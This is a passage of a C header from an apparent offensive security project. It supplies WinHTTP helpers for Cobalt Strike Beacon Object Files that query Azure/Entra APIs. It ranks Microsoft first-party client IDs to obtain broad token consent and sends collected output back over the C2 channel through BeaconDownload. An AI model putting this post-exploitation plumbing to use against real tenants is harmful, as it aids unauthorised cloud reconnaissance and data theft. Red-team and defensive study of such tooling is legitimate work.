/*
 * http_utils.h - Shared HTTP utility functions for BARK BOFs
 *
 * Provides WinHTTP-based HTTPS request helpers for use in Cobalt Strike
 * Beacon Object Files (BOFs) that interact with Azure/Entra REST APIs.
 *
 * Usage:
 *   #include "../include/beacon.h"
 *   #include "../include/http_utils.h"
 *
 * Author: BARK BOF project
 * License: GPLv3
 */

#pragma once
#ifndef _BARK_HTTP_UTILS_H_
#define _BARK_HTTP_UTILS_H_

#include <windows.h>
#include "beacon.h"

/* ================================================================
 * WinHTTP DLL imports (BOF-style: LIBRARY$Function)
 * ================================================================ */
DECLSPEC_IMPORT HINTERNET WINAPI WINHTTP$WinHttpOpen(
    LPCWSTR pszAgentW, DWORD dwAccessType,
    LPCWSTR pszProxyW, LPCWSTR pszProxyBypassW, DWORD dwFlags);

DECLSPEC_IMPORT HINTERNET WINAPI WINHTTP$WinHttpConnect(
    HINTERNET hSession, LPCWSTR pswzServerName,
    INTERNET_PORT nServerPort, DWORD dwReserved);

DECLSPEC_IMPORT HINTERNET WINAPI WINHTTP$WinHttpOpenRequest(
    HINTERNET hConnect, LPCWSTR pwszVerb, LPCWSTR pwszObjectName,
    LPCWSTR pwszVersion, LPCWSTR pwszReferrer,
    LPCWSTR FAR *ppwszAcceptTypes, DWORD dwFlags);

DECLSPEC_IMPORT BOOL WINAPI WINHTTP$WinHttpSendRequest(
    HINTERNET hRequest, LPCWSTR lpszHeaders, DWORD dwHeadersLength,
    LPVOID lpOptional, DWORD dwOptionalLength,
    DWORD dwTotalLength, DWORD_PTR dwContext);

DECLSPEC_IMPORT BOOL WINAPI WINHTTP$WinHttpReceiveResponse(
    HINTERNET hRequest, LPVOID lpReserved);

DECLSPEC_IMPORT BOOL WINAPI WINHTTP$WinHttpQueryDataAvailable(
    HINTERNET hRequest, LPDWORD lpdwNumberOfBytesAvailable);

DECLSPEC_IMPORT BOOL WINAPI WINHTTP$WinHttpReadData(
    HINTERNET hRequest, LPVOID lpBuffer,
    DWORD dwNumberOfBytesToRead, LPDWORD lpdwNumberOfBytesRead);

DECLSPEC_IMPORT BOOL WINAPI WINHTTP$WinHttpCloseHandle(HINTERNET hInternet);

DECLSPEC_IMPORT BOOL WINAPI WINHTTP$WinHttpAddRequestHeaders(
    HINTERNET hRequest, LPCWSTR lpszHeaders,
    DWORD dwHeadersLength, DWORD dwModifiers);

DECLSPEC_IMPORT BOOL WINAPI WINHTTP$WinHttpQueryHeaders(
    HINTERNET hRequest, DWORD dwInfoLevel, LPCWSTR pwszName,
    LPVOID lpBuffer, LPDWORD lpdwBufferLength, LPDWORD lpdwIndex);

DECLSPEC_IMPORT BOOL WINAPI WINHTTP$WinHttpSetOption(
    HINTERNET hInternet, DWORD dwOption,
    LPVOID lpBuffer, DWORD dwBufferLength);

/* ================================================================
 * Kernel32 imports
 * ================================================================ */
WINBASEAPI HANDLE WINAPI KERNEL32$GetProcessHeap(VOID);
WINBASEAPI LPVOID WINAPI KERNEL32$HeapAlloc(HANDLE hHeap, DWORD dwFlags, SIZE_T dwBytes);
WINBASEAPI BOOL   WINAPI KERNEL32$HeapFree(HANDLE hHeap, DWORD dwFlags, LPVOID lpMem);
WINBASEAPI HANDLE WINAPI KERNEL32$CreateFileA(
    LPCSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode,
    LPSECURITY_ATTRIBUTES lpSA, DWORD dwCreationDisposition,
    DWORD dwFlagsAndAttributes, HANDLE hTemplate);
WINBASEAPI BOOL   WINAPI KERNEL32$WriteFile(
    HANDLE h, LPCVOID buf, DWORD len, LPDWORD written, LPVOID lpOverlapped);
WINBASEAPI BOOL   WINAPI KERNEL32$CloseHandle(HANDLE h);
WINBASEAPI void   WINAPI KERNEL32$GetLocalTime(LPSYSTEMTIME lpst);
WINBASEAPI DWORD  WINAPI KERNEL32$GetTempPathA(DWORD nBufLen, LPSTR lpBuffer);
WINBASEAPI DWORD  WINAPI KERNEL32$GetLastError(VOID);
WINBASEAPI int    WINAPI KERNEL32$MultiByteToWideChar(
    UINT CodePage, DWORD dwFlags, LPCCH lpMultiByteStr, int cbMultiByte,
    LPWSTR lpWideCharStr, int cchWideChar);
WINBASEAPI int    WINAPI KERNEL32$WideCharToMultiByte(
    UINT CodePage, DWORD dwFlags, LPCWCH lpWideCharStr, int cchWideChar,
    LPSTR lpMultiByteStr, int cbMultiByte, LPCCH lpDefaultChar, LPBOOL lpUsedDefaultChar);
WINBASEAPI int    WINAPI KERNEL32$lstrlenA(LPCSTR lpString);
WINBASEAPI int    WINAPI KERNEL32$lstrlenW(LPCWSTR lpString);
WINBASEAPI void   WINAPI KERNEL32$Sleep(DWORD dwMilliseconds);
WINBASEAPI DWORD  WINAPI KERNEL32$GetTickCount(VOID);
WINBASEAPI HANDLE WINAPI KERNEL32$CreateThread(
    LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize,
    LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter,
    DWORD dwCreationFlags, LPDWORD lpThreadId);
WINBASEAPI DWORD  WINAPI KERNEL32$WaitForSingleObject(HANDLE hHandle, DWORD dwMilliseconds);

/* ================================================================
 * MSVCRT imports
 * ================================================================ */
DECLSPEC_IMPORT int    __cdecl MSVCRT$sprintf_s(char *buffer, size_t sizeOfBuffer, const char *format, ...);
DECLSPEC_IMPORT int    __cdecl MSVCRT$swprintf_s(wchar_t *buffer, size_t sizeOfBuffer, const wchar_t *format, ...);
DECLSPEC_IMPORT size_t __cdecl MSVCRT$strlen(const char *str);
DECLSPEC_IMPORT char * __cdecl MSVCRT$strncpy(char *dest, const char *src, size_t count);
DECLSPEC_IMPORT char * __cdecl MSVCRT$strstr(const char *str1, const char *str2);
DECLSPEC_IMPORT char * __cdecl MSVCRT$strcpy(char *dest, const char *src);
DECLSPEC_IMPORT char * __cdecl MSVCRT$strcat(char *dest, const char *src);
DECLSPEC_IMPORT int    __cdecl MSVCRT$strcmp(const char *str1, const char *str2);
DECLSPEC_IMPORT void * __cdecl MSVCRT$memcpy(void *dest, const void *src, size_t count);
DECLSPEC_IMPORT void * __cdecl MSVCRT$memset(void *ptr, int value, size_t num);
DECLSPEC_IMPORT int    __cdecl MSVCRT$strncmp(const char *str1, const char *str2, size_t n);

/* ================================================================
 * Default client IDs used when none is supplied by the caller.
 *
 * The storage order is stable; BarkClientIndexForResource() supplies the
 * capability-ranked attempt order for each requested resource.  This avoids
 * accepting a narrower service-specific client before a client with broader
 * useful consent for Graph, legacy AAD Graph, ARM, or Microsoft 365 APIs.
 * ================================================================ */
static const char *BARK_DEFAULT_CLIENT_IDS[] = {
    "04b07795-8ddb-461a-bbee-02f9e1bf7b46",  /* Microsoft Azure CLI */
    "1950a258-227b-4e31-a9cf-717495945fc2",  /* Microsoft Azure PowerShell */
    "1b730954-1685-4b74-9bfd-dac224a7b894",  /* Azure Active Directory PowerShell */
    "d326c1ce-6cc6-4de2-bebc-4591e5e13ef0",  /* SharePoint */
    "d3590ed6-52b3-4102-aeff-aad2292ab01c",  /* Microsoft Office */
    "1fec8e78-bce4-4aaf-ab1b-5451cc387264",  /* Microsoft Teams */
};
static const char *BARK_DEFAULT_CLIENT_NAMES[] = {
    "Microsoft Azure CLI",
    "Microsoft Azure PowerShell",
    "Azure Active Directory PowerShell",
    "SharePoint",
    "Microsoft Office",
    "Microsoft Teams",
};
#define BARK_DEFAULT_CLIENT_ID_COUNT 6

#define BARK_CLIENT_AZURE_CLI       0
#define BARK_CLIENT_AZURE_PS        1
#define BARK_CLIENT_AAD_PS          2
#define BARK_CLIENT_SHAREPOINT      3
#define BARK_CLIENT_OFFICE          4
#define BARK_CLIENT_TEAMS           5

/* Return the client-array index for a zero-based attempt number.  Orders are
 * resource-aware: directory clients lead Graph requests, management clients
 * lead Azure resource/data-plane requests, and Office clients lead Microsoft
 * 365 service requests.  Every profile still tries all six clients. */
static int BarkClientIndexForResource(const char *resource, int attempt) {
    static const int graphOrder[] = {
        BARK_CLIENT_AZURE_CLI, BARK_CLIENT_AAD_PS, BARK_CLIENT_TEAMS,
        BARK_CLIENT_OFFICE, BARK_CLIENT_AZURE_PS, BARK_CLIENT_SHAREPOINT
    };
    static const int legacyGraphOrder[] = {
        BARK_CLIENT_AAD_PS, BARK_CLIENT_AZURE_CLI, BARK_CLIENT_AZURE_PS,
        BARK_CLIENT_OFFICE, BARK_CLIENT_TEAMS, BARK_CLIENT_SHAREPOINT
    };
    static const int azureOrder[] = {
        BARK_CLIENT_AZURE_CLI, BARK_CLIENT_AZURE_PS, BARK_CLIENT_AAD_PS,
        BARK_CLIENT_OFFICE, BARK_CLIENT_TEAMS, BARK_CLIENT_SHAREPOINT
    };
    static const int officeOrder[] = {
        BARK_CLIENT_OFFICE, BARK_CLIENT_TEAMS, BARK_CLIENT_SHAREPOINT,
        BARK_CLIENT_AZURE_CLI, BARK_CLIENT_AZURE_PS, BARK_CLIENT_AAD_PS
    };
    static const int broadOrder[] = {
        BARK_CLIENT_AZURE_CLI, BARK_CLIENT_AAD_PS, BARK_CLIENT_TEAMS,
        BARK_CLIENT_OFFICE, BARK_CLIENT_AZURE_PS, BARK_CLIENT_SHAREPOINT
    };
    const int *order = broadOrder;

    if (attempt < 0 || attempt >= BARK_DEFAULT_CLIENT_ID_COUNT)
        return BARK_CLIENT_AZURE_CLI;

    if (resource) {
        if (MSVCRT$strstr(resource, "graph.windows.net"))
            order = legacyGraphOrder;
        else if (MSVCRT$strstr(resource, "graph.microsoft.com"))
            order = graphOrder;
        else if (MSVCRT$strstr(resource, "management.azure.com") ||
                 MSVCRT$strstr(resource, "storage.azure.com") ||
                 MSVCRT$strstr(resource, "vault.azure.net"))
            order = azureOrder;
        else if (MSVCRT$strstr(resource, "office") ||
                 MSVCRT$strstr(resource, "outlook") ||
                 MSVCRT$strstr(resource, "sharepoint") ||
                 MSVCRT$strstr(resource, "spaces.skype") ||
                 MSVCRT$strstr(resource, "teams"))
            order = officeOrder;
    }

    return order[attempt];
}

/* ================================================================
 * WinHTTP / WinINet constants not pulled in by <windows.h> alone
 * ================================================================ */
#ifndef WINHTTP_ACCESS_TYPE_DEFAULT_PROXY
#define WINHTTP_ACCESS_TYPE_DEFAULT_PROXY   0
#endif
#ifndef WINHTTP_NO_PROXY_NAME
#define WINHTTP_NO_PROXY_NAME               NULL
#endif
#ifndef WINHTTP_NO_PROXY_BYPASS
#define WINHTTP_NO_PROXY_BYPASS             NULL
#endif
#ifndef WINHTTP_FLAG_SECURE
#define WINHTTP_FLAG_SECURE                 0x00800000
#endif
#ifndef WINHTTP_NO_REFERER
#define WINHTTP_NO_REFERER                  NULL
#endif
#ifndef WINHTTP_DEFAULT_ACCEPT_TYPES
#define WINHTTP_DEFAULT_ACCEPT_TYPES        NULL
#endif
#ifndef WINHTTP_NO_ADDITIONAL_HEADERS
#define WINHTTP_NO_ADDITIONAL_HEADERS       NULL
#endif
#ifndef WINHTTP_ADDREQ_FLAG_ADD
#define WINHTTP_ADDREQ_FLAG_ADD             0x20000000
#endif
#ifndef INTERNET_DEFAULT_HTTPS_PORT
#define INTERNET_DEFAULT_HTTPS_PORT         443
#endif
#ifndef HEAP_ZERO_MEMORY
#define HEAP_ZERO_MEMORY                    0x00000008
#endif
/* WINHTTP_QUERY_STATUS_CODE (19) | WINHTTP_QUERY_FLAG_NUMBER (0x20000000) */
#ifndef WINHTTP_QUERY_STATUS_CODE_NUM
#define WINHTTP_QUERY_STATUS_CODE_NUM       0x20000013
#endif
#ifndef WINHTTP_QUERY_RETRY_AFTER
#define WINHTTP_QUERY_RETRY_AFTER            46
#endif

/* Request metrics and shared HTTP pacing.  These are BOF-local statics. */
static volatile LONG BarkHttpRequestCount;
static volatile LONG BarkHttpRetryCount;
static volatile LONG BarkHttp429Count;
static volatile LONG BarkHttpQuiet;
static volatile LONG BarkGraphThrottleLock;
static volatile LONG BarkGraphNextRequestTick;
#ifdef BARK_PARALLEL_OUTPUT
/* Parallel umbrella BOFs may finish multiple output buffers together.
 * Serialize BeaconDownload/CreateFile delivery while leaving HTTP requests
 * concurrent; Beacon's output APIs are not a useful place for fan-out. */
static volatile LONG BarkOutputLock;
#endif
/* Start with conservative pacing and increase it adaptively after a 429. */
static volatile LONG BarkGraphRequestIntervalMs = 50;

#define BARK_HTTP_DEFAULT_REQUEST_INTERVAL_MS 50
#define BARK_GRAPH_DEFAULT_REQUEST_INTERVAL_MS 100
#define BARK_HTTP_MAX_REQUEST_INTERVAL_MS 1000

/* GCC emits these as lock-prefixed instructions for both MinGW targets.
 * Keeping them compiler-intrinsic avoids a KERNEL32$Interlocked* import,
 * which is not available through all Beacon API resolvers. */
static LONG BarkAtomicCompareExchange(volatile LONG *destination,
                                      LONG exchange, LONG comparand) {
    return __sync_val_compare_and_swap(destination, comparand, exchange);
}

static LONG BarkAtomicIncrement(volatile LONG *addend) {
    return __sync_add_and_fetch(addend, 1);
}

#ifdef BARK_PARALLEL_OUTPUT
static void BarkOutputLockAcquire(void) {
    while (BarkAtomicCompareExchange(&BarkOutputLock, 1, 0) != 0)
        KERNEL32$Sleep(1);
}

static void BarkOutputLockRelease(void) {
    __sync_lock_release(&BarkOutputLock);
}
#endif

static int BarkHttpIsGraphHost(LPCWSTR host) {
    static const WCHAR graph[] = L"graph.microsoft.com";
    static const WCHAR legacy[] = L"graph.windows.net";
    const WCHAR *p;
    const WCHAR *q;
    if (!host) return 0;
    p = host; q = graph;
    while (*p && *q && *p == *q) { p++; q++; }
    if (!*p && !*q) return 1;
    p = host; q = legacy;
    while (*p && *q && *p == *q) { p++; q++; }
    return !*p && !*q;
}

static int BarkHttpIsTokenHost(LPCWSTR host) {
    static const WCHAR tokenHost[] = L"login.microsoftonline.com";
    const WCHAR *p;
    const WCHAR *q;
    if (!host) return 0;
    p = host;
    q = tokenHost;
    while (*p && *q && *p == *q) { p++; q++; }
    return !*p && !*q;
}

static void BarkGraphThrottleBeforeRequest(LPCWSTR host) {
    for (;;) {
        DWORD now;
        LONG next;
        LONG interval;
        DWORD waitMs;

        while (BarkAtomicCompareExchange(
                   &BarkGraphThrottleLock, 1, 0) != 0)
            KERNEL32$Sleep(1);

        now = KERNEL32$GetTickCount();
        next = BarkGraphNextRequestTick;
        interval = BarkGraphRequestIntervalMs;
        if (interval < BARK_HTTP_DEFAULT_REQUEST_INTERVAL_MS)
            interval = BARK_HTTP_DEFAULT_REQUEST_INTERVAL_MS;
        if (BarkHttpIsGraphHost(host) &&
            interval < BARK_GRAPH_DEFAULT_REQUEST_INTERVAL_MS)
            interval = BARK_GRAPH_DEFAULT_REQUEST_INTERVAL_MS;
        if ((LONG)(next - (LONG)now) > 0) {
            waitMs = (DWORD)((LONG)next - (LONG)now);
            BarkGraphThrottleLock = 0;
            KERNEL32$Sleep(waitMs);
            continue;
        }
        BarkGraphNextRequestTick = (LONG)(now + interval);
        BarkGraphThrottleLock = 0;
        return;
    }
}

static void BarkGraphThrottleAfter429(LPCWSTR host, DWORD retryAfterSeconds) {
    DWORD now;
    LONG requested;
    LONG interval;
    if (retryAfterSeconds == 0) retryAfterSeconds = 1;
    if (retryAfterSeconds > 60) retryAfterSeconds = 60;
    now = KERNEL32$GetTickCount();
    requested = (LONG)(now + retryAfterSeconds * 1000UL);

    while (BarkAtomicCompareExchange(
               &BarkGraphThrottleLock, 1, 0) != 0)
        KERNEL32$Sleep(1);
    interval = BarkGraphRequestIntervalMs;
    if (interval < BARK_HTTP_DEFAULT_REQUEST_INTERVAL_MS)
        interval = BARK_HTTP_DEFAULT_REQUEST_INTERVAL_MS;
    if (BarkHttpIsGraphHost(host) &&
        interval < BARK_GRAPH_DEFAULT_REQUEST_INTERVAL_MS)
        interval = BARK_GRAPH_DEFAULT_REQUEST_INTERVAL_MS;
    if (interval < BARK_HTTP_MAX_REQUEST_INTERVAL_MS) interval *= 2;
    if (interval > BARK_HTTP_MAX_REQUEST_INTERVAL_MS)
        interval = BARK_HTTP_MAX_REQUEST_INTERVAL_MS;
    BarkGraphRequestIntervalMs = interval;
    if ((LONG)(requested - BarkGraphNextRequestTick) > 0)
        BarkGraphNextRequestTick = requested;
    BarkGraphThrottleLock = 0;
}

static void BarkHttpMetricsReset(void) {
    BarkHttpRequestCount = 0;
    BarkHttpRetryCount = 0;
    BarkHttp429Count = 0;
    BarkGraphNextRequestTick = 0;
    BarkGraphRequestIntervalMs = BARK_HTTP_DEFAULT_REQUEST_INTERVAL_MS;
}

/* ================================================================
 * Argument helpers
 * ================================================================ */

/* Convert a possibly-NULL BeaconDataExtract result into a guaranteed
 * non-NULL C string. Returns the pointer unchanged if non-NULL, or
 * a static empty string "" otherwise. Use immediately after every
 * BeaconDataExtract() call to make subsequent strlen/printf/strstr
 * uses safe. */
#define SAFE_STR(p) ((p) ? (p) : "")

/* ================================================================
 * Memory helpers
 * ================================================================ */

/* Allocate zeroed heap memory */
static void *HAlloc(SIZE_T size) {
    return KERNEL32$HeapAlloc(KERNEL32$GetProcessHeap(), HEAP_ZERO_MEMORY, size);
}

/* Free heap allocation */
static void HFree(void *ptr) {
    if (ptr) KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, ptr);
}

/* ================================================================
 * Download mode flag
 *
 * When g_use_download == 1, BarkWriteOutput sends the buffer via
 * BeaconDownload (C2 channel) instead of writing to target disk.
 * Set per-BOF from the last bof_pack argument.
 * ================================================================ */
static int g_use_download = 0;
static int g_emit_resource_snapshot = 0;
static DWORD g_resource_snapshot_bytes = 0;
static int g_resource_snapshot_overflow = 0;

static void BarkConfigureResourceSnapshot(int enabled) {
    g_emit_resource_snapshot = enabled ? 1 : 0;
    g_resource_snapshot_bytes = 0;
    g_resource_snapshot_overflow = 0;
}

/* BeaconDownload can repeat the first half of a transfer on SMB-linked
 * Beacons when a call exceeds 256 KiB.  Keep every C2 transfer at or below
 * this conservative limit and let bark.cna reassemble the uniquely named
 * local parts.  This constant is shared by JSON, ZIP, and Blob delivery. */
#define BARK_DOWNLOAD_CHUNK (256u * 1024u)

static void BarkWriteOutput(const char *filename, const char *buf, DWORD len) {
#ifdef BARK_PARALLEL_OUTPUT
    BarkOutputLockAcquire();
#endif
    if (g_use_download) {
        if (len <= BARK_DOWNLOAD_CHUNK) {
            if (!BeaconDownload(filename, buf, len)) {
                BeaconPrintf(CALLBACK_ERROR,
                    "[-] Download failed for %s (%lu bytes)\n",
                    filename, (unsigned long)len);
            } else {
                BeaconPrintf(CALLBACK_OUTPUT,
                    "[+] Downloaded %s (%lu bytes)\n",
                    filename, (unsigned long)len);
            }
        } else {
            DWORD offset = 0;
            DWORD part = 0;
            DWORD partCount = (len + BARK_DOWNLOAD_CHUNK - 1u) /
                BARK_DOWNLOAD_CHUNK;
            int failed = 0;

            while (offset < len) {
                DWORD partLen = len - offset;
                char partName[340];
                if (partLen > BARK_DOWNLOAD_CHUNK)
                    partLen = BARK_DOWNLOAD_CHUNK;
                MSVCRT$sprintf_s(partName, sizeof(partName),
                    "%s.part%03luof%03lu", filename,
                    (unsigned long)part, (unsigned long)partCount);
                if (!BeaconDownload(partName, buf + offset, partLen)) {
                    BeaconPrintf(CALLBACK_ERROR,
                        "[-] Download failed for %s (%lu bytes)\n",
                        partName, (unsigned long)partLen);
                    failed = 1;
                    break;
                }
                offset += partLen;
                part++;
            }
            if (!failed) {
                BeaconPrintf(CALLBACK_OUTPUT,
                    "[+] Downloaded %s in %lu part(s) (%lu bytes)\n",
                    filename, (unsigned long)partCount,
                    (unsigned long)len);
            }
        }
    } else {
        HANDLE h = KERNEL32$CreateFileA(filename,
            GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
        if (h == INVALID_HANDLE_VALUE) {
            BeaconPrintf(CALLBACK_ERROR,
                "[-] CreateFile %s failed (LastError=%lu)\n",
                filename, KERNEL32$GetLastError());
#ifdef BARK_PARALLEL_OUTPUT
            BarkOutputLockRelease();
#endif
            return;
        }
        DWORD written = 0;
        KERNEL32$WriteFile(h, buf, len, &written, NULL);
        KERNEL32$CloseHandle(h);
        BeaconPrintf(CALLBACK_OUTPUT,
            "[+] Saved to %s (%lu bytes)\n", filename, (unsigned long)len);
    }
#ifdef BARK_PARALLEL_OUTPUT
    BarkOutputLockRelease();
#endif
}

/* ================================================================
 * MbsToWcs
 *
 * Convert a narrow (UTF-8) string to a heap-allocated wide string.
 * Caller must free the returned pointer with HFree().
 * Returns NULL on failure.
 * ================================================================ */
static LPWSTR MbsToWcs(const char *str) {
    if (!str) return NULL;
    int len = KERNEL32$MultiByteToWideChar(CP_UTF8, 0, str, -1, NULL, 0);
    if (len <= 0) return NULL;
    LPWSTR wide = (LPWSTR)HAlloc((SIZE_T)len * sizeof(WCHAR));
    if (!wide) return NULL;
    KERNEL32$MultiByteToWideChar(CP_UTF8, 0, str, -1, wide, len);
    return wide;
}

/* ================================================================
 * HttpRequest
 *
 * Makes an HTTPS request and returns a heap-allocated, NUL-terminated
 * response body string. Returns NULL on failure.
 * Caller must free the returned buffer with HFree().
 *
 * Parameters:
 *   method       - wide HTTP method (L"GET", L"POST", L"PUT", etc.)
 *   host         - wide hostname  (e.g. L"graph.microsoft.com")
 *   path         - wide URL path  (e.g. L"/v1.0/users")
 *   extraHeaders - additional headers as wide string (may be NULL)
 *                  Each header must end with \r\n
 *   body         - request body bytes (may be NULL)
 *   bodyLen      - length of body in bytes
 *   outStatus    - optional: receives HTTP status code; 0 on error
 * ================================================================ */
static char *HttpRequestEx(
    LPCWSTR method,
    LPCWSTR host,
    LPCWSTR path,
    LPCWSTR extraHeaders,
    const void *body,
    DWORD bodyLen,
    DWORD *outStatus,
    DWORD *outRetryAfterSeconds,
    int *outRetryAfterPresent)
{
    HINTERNET hSession  = NULL;
    HINTERNET hConnect  = NULL;
    HINTERNET hRequest  = NULL;
    char     *respBuf   = NULL;
    DWORD     totalRead = 0;
    DWORD     capacity  = 65536;
    DWORD     status    = 0;
    DWORD     statusSz  = sizeof(DWORD);
    DWORD     lastErr   = 0;
    int       failStep  = 0;  /* 1=Open 2=Connect 3=OpenRequest 4=SendRequest 5=ReceiveResponse */

    if (outStatus) *outStatus = 0;
    if (outRetryAfterSeconds) *outRetryAfterSeconds = 0;
    if (outRetryAfterPresent) *outRetryAfterPresent = 0;

    hSession = WINHTTP$WinHttpOpen(
        L"BARK-BOF/1.0",
        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
        WINHTTP_NO_PROXY_NAME,
        WINHTTP_NO_PROXY_BYPASS,
        0);
    if (!hSession) { lastErr = KERNEL32$GetLastError(); failStep = 1; goto cleanup; }

    hConnect = WINHTTP$WinHttpConnect(
        hSession, host, INTERNET_DEFAULT_HTTPS_PORT, 0);
    if (!hConnect) { lastErr = KERNEL32$GetLastError(); failStep = 2; goto cleanup; }

    hRequest = WINHTTP$WinHttpOpenRequest(
        hConnect, method, path, NULL,
        WINHTTP_NO_REFERER,
        WINHTTP_DEFAULT_ACCEPT_TYPES,
        WINHTTP_FLAG_SECURE);
    if (!hRequest) { lastErr = KERNEL32$GetLastError(); failStep = 3; goto cleanup; }

    if (extraHeaders) {
        WINHTTP$WinHttpAddRequestHeaders(
            hRequest, extraHeaders, (DWORD)-1L, WINHTTP_ADDREQ_FLAG_ADD);
    }

    if (!WINHTTP$WinHttpSendRequest(
            hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
            (LPVOID)body, bodyLen, bodyLen, 0))
    { lastErr = KERNEL32$GetLastError(); failStep = 4; goto cleanup; }

    if (!WINHTTP$WinHttpReceiveResponse(hRequest, NULL))
    { lastErr = KERNEL32$GetLastError(); failStep = 5; goto cleanup; }

    /* Retrieve HTTP status code */
    WINHTTP$WinHttpQueryHeaders(hRequest,
        WINHTTP_QUERY_STATUS_CODE_NUM,
        NULL, &status, &statusSz, NULL);
    if (outStatus) *outStatus = status;

    /* Azure normally sends Retry-After as delta-seconds; date values fall back safely. */
    {
        WCHAR retryAfter[64];
        DWORD retryAfterSz = sizeof(retryAfter);
        if (WINHTTP$WinHttpQueryHeaders(hRequest, WINHTTP_QUERY_RETRY_AFTER,
                                        NULL, retryAfter, &retryAfterSz, NULL)) {
            DWORD i = 0;
            DWORD seconds = 0;
            int valid = retryAfterSz >= sizeof(WCHAR);
            while (valid && i < retryAfterSz / sizeof(WCHAR) &&
                   retryAfter[i] >= L'0' && retryAfter[i] <= L'9') {
                DWORD digit = (DWORD)(retryAfter[i] - L'0');
                if (seconds > (0xFFFFFFFFUL - digit) / 10UL) {
                    valid = 0;
                    break;
                }
                seconds = seconds * 10UL + digit;
                i++;
            }
            if (valid && i > 0 &&
                (i == retryAfterSz / sizeof(WCHAR) || retryAfter[i] == L'\0')) {
                if (outRetryAfterSeconds) *outRetryAfterSeconds = seconds;
                if (outRetryAfterPresent) *outRetryAfterPresent = 1;
            }
        }
    }

    /* Allocate initial response buffer */
    respBuf = (char *)HAlloc(capacity);
    if (!respBuf) goto cleanup;

    /* Read body in chunks */
    for (;;) {
        DWORD avail = 0;
        DWORD nread = 0;

        if (!WINHTTP$WinHttpQueryDataAvailable(hRequest, &avail))
            break;
        if (avail == 0)
            break;

        /* Grow buffer if needed */
        if (totalRead + avail + 1 >= capacity) {
            DWORD newCap = totalRead + avail + 65536;
            char *newBuf = (char *)HAlloc(newCap);
            if (!newBuf) {
                HFree(respBuf);
                respBuf = NULL;
                goto cleanup;
            }
            MSVCRT$memcpy(newBuf, respBuf, totalRead);
            HFree(respBuf);
            respBuf  = newBuf;
            capacity = newCap;
        }

        if (!WINHTTP$WinHttpReadData(
                hRequest, respBuf + totalRead, avail, &nread))
            break;
        totalRead += nread;
    }

    if (respBuf)
        respBuf[totalRead] = '\0';

cleanup:
    if (hRequest) WINHTTP$WinHttpCloseHandle(hRequest);
    if (hConnect) WINHTTP$WinHttpCloseHandle(hConnect);
    if (hSession) WINHTTP$WinHttpCloseHandle(hSession);
    if (!respBuf && failStep > 0 && !BarkHttpQuiet) {
        static const char *steps[] = { "", "WinHttpOpen", "WinHttpConnect", "WinHttpOpenRequest",
                                        "WinHttpSendRequest", "WinHttpReceiveResponse" };
        BeaconPrintf(CALLBACK_ERROR,
            "[-] HttpRequest: %s failed (Win32 error %lu)\n",
            steps[failStep], (unsigned long)lastErr);
    }
    return respBuf;
}

static int BarkHttpMethodIsIdempotent(LPCWSTR method);
static char *HttpRequestWithRetry(
    LPCWSTR method, LPCWSTR host, LPCWSTR path, LPCWSTR extraHeaders,
    const void *body, DWORD bodyLen, DWORD *outStatus);

/* Compatibility wrapper.  All requests pass through pacing and response
 * handling; only idempotent methods and OAuth token exchanges are retried. */
static char *HttpRequest(
    LPCWSTR method,
    LPCWSTR host,
    LPCWSTR path,
    LPCWSTR extraHeaders,
    const void *body,
    DWORD bodyLen,
    DWORD *outStatus)
{
    return HttpRequestWithRetry(method, host, path, extraHeaders, body,
                                bodyLen, outStatus);
}

static int BarkHttpMethodIsIdempotent(LPCWSTR method) {
    static const LPCWSTR methods[] = {
        L"GET", L"HEAD", L"PUT", L"DELETE", L"OPTIONS", L"TRACE"
    };
    int i;
    if (!method) return 0;
    for (i = 0; i < (int)(sizeof(methods) / sizeof(methods[0])); i++) {
        const WCHAR *a = method;
        const WCHAR *b = methods[i];
        while (*a && *b && *a == *b) { a++; b++; }
        if (!*a && !*b) return 1;
    }
    return 0;
}

/* ================================================================
 * HttpRequestWithRetry
 *
 * Wrapper around HttpRequest with retry logic for transient errors.
 * Honors numeric Retry-After, with bounded fallback delays when absent.
 * Idempotent methods and OAuth token exchanges are retried; max 3 retries
 * (4 total attempts).  Other state-changing requests are paced but never
 * automatically replayed.
 * ================================================================ */
static char *HttpRequestWithRetry(
    LPCWSTR method,
    LPCWSTR host,
    LPCWSTR path,
    LPCWSTR extraHeaders,
    const void *body,
    DWORD bodyLen,
    DWORD *outStatus)
{
    char *resp = NULL;
    int retry = 0;
    const int maxRetries = 3;
    const DWORD maxDelaySec = 60;
    int canRetry = BarkHttpMethodIsIdempotent(method) ||
                   BarkHttpIsTokenHost(host);

    while (retry <= maxRetries) {
        DWORD retryAfterSeconds = 0;
        DWORD st = 0;
        int retryAfterPresent = 0;
        BarkGraphThrottleBeforeRequest(host);
        BarkAtomicIncrement(&BarkHttpRequestCount);
        resp = HttpRequestEx(method, host, path, extraHeaders, body, bodyLen,
                             &st, &retryAfterSeconds, &retryAfterPresent);
        if (outStatus) *outStatus = st;

        if (!resp && st == 0) {
            if (canRetry && retry < maxRetries) {
                DWORD sleepSec = (DWORD)(2 << retry);
                if (sleepSec > maxDelaySec) sleepSec = maxDelaySec;
                if (!BarkHttpQuiet)
                    BeaconPrintf(CALLBACK_OUTPUT,
                        "[*] Connection failed — retrying in %lu seconds (attempt %d/%d)\n",
                        sleepSec, retry + 1, maxRetries);
                KERNEL32$Sleep(sleepSec * 1000);
                BarkAtomicIncrement(&BarkHttpRetryCount);
                retry++;
                continue;
            }
            return resp;
        }

        if (st < 400)
            return resp;

        if (st == 429) {
            BarkAtomicIncrement(&BarkHttp429Count);
            BarkGraphThrottleAfter429(
                host, retryAfterPresent ? retryAfterSeconds :
                (DWORD)((retry + 1) * 10));
        }

        if (!canRetry)
            return resp;

        DWORD sleepSec = 0;
        if (st != 429 && st < 500) {
            return resp;
        }

        /* Server guidance wins; otherwise use bounded status-specific backoff. */
        if (retryAfterPresent) {
            sleepSec = retryAfterSeconds;
        } else if (st == 429) {
            sleepSec = (DWORD)((retry + 1) * 10);
        } else {
            sleepSec = (DWORD)(2 << retry);
        }
        if (sleepSec > maxDelaySec) sleepSec = maxDelaySec;

        if (retry < maxRetries) {
            if (!BarkHttpQuiet)
                BeaconPrintf(CALLBACK_OUTPUT,
